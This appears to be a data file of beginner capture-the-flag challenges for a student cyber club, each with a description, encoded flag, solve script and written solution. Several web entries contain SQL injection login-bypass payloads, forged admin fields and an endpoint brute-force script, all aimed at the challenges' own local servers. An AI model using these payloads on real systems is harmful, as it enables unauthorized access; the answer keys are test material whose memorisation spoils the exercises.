@@ -1,0 +1,373 @@
+[
+  {
+    "slug": "poster-wall",
+    "name": "poster-wall",
+    "category": "web",
+    "points": 10,
+    "events": [
+      {
+        "group": "Cyber GM",
+        "term": "Fall 2026"
+      }
+    ],
+    "sort": 20262,
+    "description": "Only ME the admin gets to put up new posters.  \n\n{{ link }}",
+    "play": "challenges/poster-wall/",
+    "files": [],
+    "in_browser_backend": true,
+    "flag": "ExYREV8SBEAcB0dfNgZDHgZHCR0J",
+    "solve_files": {
+      "solve.py": "import sys\n\nimport requests\n\nURL = sys.argv[1] if len(sys.argv) > 1 else \"http://localhost:8080\"\n\nr = requests.post(f\"{URL}/newPoster\", json={\"user\": \"admin\", \"poster\": \"anything\"})\nprint(r.text)\n"
+    },
+    "solution": "The page source has a commented-out TODO for the admin-only \"add poster\" button, including the exact `fetch(\"/newPoster\", ...)` call it would make with `user: \"guest\"`. Make that POST yourself with `user: \"admin\"` and any `poster` value."
+  },
+  {
+    "slug": "poster",
+    "name": "poster",
+    "category": "web",
+    "points": 15,
+    "events": [
+      {
+        "group": "Cyber GM",
+        "term": "Spring 2026"
+      }
+    ],
+    "sort": 20261,
+    "description": "I love posters, they make my room look great. I would like to REQUEST your help. Please find me a good one.\nSite: {{ link }}",
+    "play": "challenges/poster/",
+    "files": [
+      "challenges/poster/app.js"
+    ],
+    "in_browser_backend": true,
+    "flag": "ExYREV8SABhbHR9eNkUvA0MCHjZFBBI=",
+    "solve_files": {},
+    "solution": "The description leans on REQUEST, and the provided `app.js` has a `POST /newPoster` route that hands out the flag when the JSON body has `user: \"admin\"` and a non-empty `poster`. Nothing on the page calls it, so you send it yourself."
+  },
+  {
+    "slug": "bot-lobby",
+    "name": "bot-lobby",
+    "category": "web",
+    "points": 10,
+    "events": [
+      {
+        "group": "Cyber GM",
+        "term": "Winter 2026"
+      }
+    ],
+    "sort": 20260,
+    "description": "My squad keeps getting clapped in fortnite. Too many sweats nowadays smh. \nI NEED to be put in a bot lobby so i can get this dub, or mayhaps a RObot lobby??!?!??!?!?\n\nFind this hidden lobby where only the ROBOTS exist!\n\n{{ link }}",
+    "play": "challenges/bot-lobby/",
+    "files": [],
+    "in_browser_backend": false,
+    "flag": "ExYREV8SGgUCEUdfNkQeXCwCHAoAQB0KK19ZDUQDQAk=",
+    "solve_files": {},
+    "solution": "\"RObot lobby\" and the ender chest's hint (\"a file that robots cannot access\") both point at `robots.txt`. The `Disallow: /admin` line is a red herring; the flag is in a comment."
+  },
+  {
+    "slug": "flag-store-2",
+    "name": "flag-store-2",
+    "category": "web",
+    "points": 10,
+    "events": [
+      {
+        "group": "Cyber Academy",
+        "term": "Winter 2025"
+      },
+      {
+        "group": "Cyber Academy",
+        "term": "Spring 2025"
+      },
+      {
+        "group": "Cyber Academy",
+        "term": "Winter 2026"
+      }
+    ],
+    "sort": 20260,
+    "description": "I love flags! So much so, that I decided to make a store to sell them. I saw that the user Cyber ordered a really cool flag...\n\n{{ link }}",
+    "play": "challenges/flag-store-2/",
+    "files": [
+      "challenges/flag-store-2/provide/app.py"
+    ],
+    "in_browser_backend": true,
+    "flag": "ExYREV8SEhwOFCteHRsCCiwARQwrAx4fCQ==",
+    "solve_files": {
+      "solve.txt": "Username: anything\nPassword: ' OR username = 'Cyber' -- "
+    },
+    "solution": "The query is built with an f-string. Single quotes are blocked in the username but not the password, so log in with any username and the password `' OR username = 'Cyber' -- ` to become Cyber and see their order."
+  },
+  {
+    "slug": "flag-store-3",
+    "name": "flag-store-3",
+    "category": "web",
+    "points": 10,
+    "events": [
+      {
+        "group": "Cyber Academy",
+        "term": "Winter 2025"
+      },
+      {
+        "group": "Cyber Academy",
+        "term": "Spring 2025"
+      },
+      {
+        "group": "Cyber Academy",
+        "term": "Winter 2026"
+      }
+    ],
+    "sort": 20260,
+    "description": "I love flags! So much so, that I decided to make a store to sell them. I saw that the user Cyber ordered a really cool flag...\n\n{{ link }}",
+    "play": "challenges/flag-store-3/",
+    "files": [
+      "challenges/flag-store-3/provide/app.py"
+    ],
+    "in_browser_backend": true,
+    "flag": "ExYREV8SEhwOFCteHRsCClQHchoRARoWGAoaKwMKAgFIBQk=",
+    "solve_files": {
+      "solve.txt": "Username: \\\nPassword:  OR 1=1 OFFSET 1 ROWS; -- \n\nNote: password has a space before or and a space after --\n\nThis results in below query:\nSELECT * FROM user WHERE username = '\\' AND password = ' OR 1=1 OFFSET 1 ROWS; -- '\n"
+    },
+    "solution": "Quotes are blocked in both fields, but the query uses Postgres `E''` escape strings, where a backslash escapes the next character. A username of `\\` swallows the closing quote, so the password field becomes raw SQL: ` OR 1=1 OFFSET 1 ROWS; -- ` picks the second user, Cyber."
+  },
+  {
+    "slug": "flag-store-5",
+    "name": "flag-store-5",
+    "category": "web",
+    "points": 10,
+    "events": [
+      {
+        "group": "Cyber Academy",
+        "term": "Winter 2025"
+      },
+      {
+        "group": "Cyber Academy",
+        "term": "Spring 2025"
+      },
+      {
+        "group": "Cyber Academy",
+        "term": "Winter 2026"
+      }
+    ],
+    "sort": 20260,
+    "description": "I love flags! So much so, that I decided to make a store to sell them. I saw that the user Cyber ordered a really cool flag...\n\n{{ link }}",
+    "play": "challenges/flag-store-5/",
+    "files": [
+      "challenges/flag-store-5/provide/app.py"
+    ],
+    "in_browser_backend": true,
+    "flag": "ExYREV8SOz0oLC1iPCs2ICY6aTYgOCosMmEoMzcoNDNqFA==",
+    "solve_files": {
+      "solve.txt": "Username: Cyber\nPassword: ' OR username LIKE 'C%'; -- -"
+    },
+    "solution": "Both fields are upper-cased before the query, so `'Cyber'` turns into `'CYBER'` and an `=` comparison misses. SQLite's `LIKE` is case-insensitive, so the password `' OR username LIKE 'C%'; -- -` still lands on Cyber."
+  },
+  {
+    "slug": "post-it",
+    "name": "post-it",
+    "category": "web",
+    "points": 10,
+    "events": [
+      {
+        "group": "Cyber GM",
+        "term": "Spring 2025"
+      },
+      {
+        "group": "Cyber GM",
+        "term": "Winter 2026"
+      }
+    ],
+    "sort": 20260,
+    "description": "You need to write something down? Maybe you should post-it?\n\n{{ link }}",
+    "play": "challenges/post-it/",
+    "files": [
+      "challenges/post-it/app.js"
+    ],
+    "in_browser_backend": true,
+    "flag": "ExYREV8SAxhbBysZNgcEXhAfVDYHQRsGFVlYRB4S",
+    "solve_files": {
+      "solve.txt": "#!/usr/bin/env python3\n\nimport requests\n\nurl = \"http://0.0.0.0:8080\"\nbody = {\"isAdmin\": \"true\"}\n\nx = requests.post(url + \"/note\", json=body)\nprint(x.content)"
+    },
+    "solution": "The provided `app.js` has a `POST /note` route that nothing on the page uses, and it trusts an `isAdmin` field from the request body. Send JSON `{\"isAdmin\": \"true\"}` to it."
+  },
+  {
+    "slug": "health-inspecty",
+    "name": "health-inspecty",
+    "category": "web",
+    "points": 10,
+    "events": [
+      {
+        "group": "Cyber GM",
+        "term": "Fall 2025"
+      }
+    ],
+    "sort": 20252,
+    "description": "Uh oh! Cyber's favorite dining hall has been INFESTED. \nYour job as the dining hall health enforcer is to inspect the area to find all of the rats!!\n{{ link }}",
+    "play": "challenges/health-inspecty/",
+    "files": [
+      "challenges/health-inspecty/app.js"
+    ],
+    "in_browser_backend": false,
+    "flag": "ExYREV8SBkQbACscBysCXkAWHhtLUU5SVQxWS08S",
+    "solve_files": {},
+    "solution": "The flag is split across the \"rats\" hiding in the page source: one in an HTML comment in the `<head>`, one in a JavaScript comment, and the last behind the link of a hidden `<img>`."
+  },
+  {
+    "slug": "plankton",
+    "name": "plankton",
+    "category": "web",
+    "points": 10,
+    "events": [
+      {
+        "group": "Cyber GM",
+        "term": "Winter 2025"
+      }
+    ],
+    "sort": 20250,
+    "description": "We have investigating Plankton recently since he has been acting a bit fishy. Try looking for any secrets he has hidden on his website.\n\n{{ link }}",
+    "play": "challenges/plankton/",
+    "files": [],
+    "in_browser_backend": false,
+    "flag": "ExYREV8SIDhcLDIdOzklXkcrelg4PDAxR3IkRT5cLD4ZJytCWA4=",
+    "solve_files": {
+      "solve.txt": "inspect element"
+    },
+    "solution": "Plankton hid the formula in an HTML comment between the Skills and Projects sections. View source or inspect element."
+  },
+  {
+    "slug": "salad",
+    "name": "salad",
+    "category": "crypto",
+    "points": 10,
+    "events": [
+      {
+        "group": "Cyber GM",
+        "term": "Winter 2025"
+      }
+    ],
+    "sort": 20250,
+    "description": "You're cooking a delisous dinner for your pet anchovy, but you're wondering what greens you should feed him. He left you a note, but you're unsure how to read it...",
+    "play": null,
+    "files": [
+      "challenges/salad/note.txt"
+    ],
+    "in_browser_backend": false,
+    "flag": "ExYREV8SHS8DBgJyChUVHBIGchoVHA4XK1QcGQkaHgk=",
+    "solve_files": {},
+    "solution": "Caesar salad, so a Caesar cipher: the note is shifted by 12 (`oknqd` → `cyber`). Shift every letter back by 12."
+  },
+  {
+    "slug": "cryptoduels",
+    "name": "cryptoduels",
+    "category": "crypto",
+    "points": 15,
+    "events": [
+      {
+        "group": "Cyber GM",
+        "term": "Fall 2024"
+      }
+    ],
+    "sort": 20242,
+    "description": "You are so close to beating your friend in crypto duels. You just have to decipher this last quote!! Check the hint if you need to.",
+    "play": null,
+    "files": [
+      "challenges/cryptoduels/small_hint.txt",
+      "challenges/cryptoduels/verysecretquote.txt"
+    ],
+    "in_browser_backend": false,
+    "flag": "ExYREV8SGx0IChtYHhseCBwbSQMbEhI=",
+    "solve_files": {},
+    "solution": "The hint says the first word is \"Nobody\", and `Mlylwb` → `Nobody` is a mirror substitution: the Atbash cipher (a↔z, b↔y, ...). Decode the last line to get the flag."
+  },
+  {
+    "slug": "deez",
+    "name": "deez",
+    "category": "web",
+    "points": 10,
+    "events": [
+      {
+        "group": "Cyber Academy",
+        "term": "Fall 2024"
+      }
+    ],
+    "sort": 20242,
+    "description": "Aw nuts! I needed to buy some cashews from the store, but i forgot them. Can you please GET them for me?!\n\n{{ link }}",
+    "play": "challenges/deez/",
+    "files": [
+      "challenges/deez/app.js"
+    ],
+    "in_browser_backend": true,
+    "flag": "ExYREV8SE0AbQEceWkdDXEBHHgRVUU4O",
+    "solve_files": {
+      "solve.txt": "curl http://0.0.0.0:3000/cashew"
+    },
+    "solution": "\"GET them for me\": the provided `app.js` serves the flag at `GET /cashew`, in both the body and a `FLAG` response header."
+  },
+  {
+    "slug": "gameing-session",
+    "name": "gameing-session",
+    "category": "web",
+    "points": 10,
+    "events": [
+      {
+        "group": "Cyber Academy",
+        "term": "Fall 2024"
+      }
+    ],
+    "sort": 20242,
+    "description": "You're playing fortnite, but you are really low on shield! Search for a shield item to get a victory royale!\n\n{{ link }}",
+    "play": "challenges/gameing-session/",
+    "files": [
+      "challenges/gameing-session/app.js"
+    ],
+    "in_browser_backend": true,
+    "flag": "ExYREV8SRB0ILA0dHCsXXwcrGTYXGBoUK0ccEw0=",
+    "solve_files": {
+      "solve.py": "import requests\nimport time\n\nbase_url = 'http://localhost:3000/a'  # Base URL of the local server\n\ndef find_flag():\n    s = requests.Session()  # Create a session\n    for num in range(1, 1001):\n        try:\n            # Send a GET request using the session\n            response = s.get(f'{base_url}/{num}')\n            print(f'Trying number: {num}, Response: {response.text}')\n                \n            # Check if the response contains the flag\n            if response.text.startswith('cyber{'):\n                print(f'Flag found! {response.text}')\n                break  # Stop searching once the flag is found\n                \n        except requests.exceptions.RequestException as e:\n            print(f'Error with number {num}: {e}')\n            \n        time.sleep(0.1)\n\nif __name__ == '__main__':\n    find_flag()\n"
+    },
+    "solution": "`GET /a/:num` returns the flag only for one random number from 1 to 1000. Loop over all of them until a response starts with `cyber{`."
+  },
+  {
+    "slug": "get-ahead",
+    "name": "get-ahead",
+    "category": "web",
+    "points": 10,
+    "events": [
+      {
+        "group": "Cyber Academy",
+        "term": "Fall 2024"
+      }
+    ],
+    "sort": 20242,
+    "description": "Patrick seems to have lost his head! Find him a new one\n\n{{ link }}",
+    "play": "challenges/get-ahead/",
+    "files": [
+      "challenges/get-ahead/app.js"
+    ],
+    "in_browser_backend": true,
+    "flag": "ExYREV8SRS8JQhoZBRgJMBVEWAcQLwIKK0VaQBQS",
+    "solve_files": {
+      "solve.txt": "curl --head http://0.0.0.0:8080/flag1\ncurl http://0.0.0.0:8080 -H 'user-agent: ocean explorer' "
+    },
+    "solution": "Two halves. `HEAD /flag1` returns the first half in a `FLAG` header (\"get a HEAD\"). `GET /` with the User-Agent `ocean explorer` returns the second half (Patrick needs a head from the ocean)."
+  },
+  {
+    "slug": "health-inspector",
+    "name": "health-inspector",
+    "category": "web",
+    "points": 10,
+    "events": [
+      {
+        "group": "Cyber GM",
+        "term": "Spring 2024"
+      }
+    ],
+    "sort": 20241,
+    "description": "My restaurant is overrun with pests! Plz help.\n\n{{ link }}",
+    "play": "challenges/health-inspector/",
+    "files": [
+      "challenges/health-inspector/app.js"
+    ],
+    "in_browser_backend": false,
+    "flag": "ExYREV8SBkBbEBweGitEARcrX10AAzBHGkk2FkMBAERDFA==",
+    "solve_files": {},
+    "solution": "One more \"pest\" is hidden on the page: an `<img>` with `display: none` and zero opacity. Find it in the source and open its URL."
+  }
+]
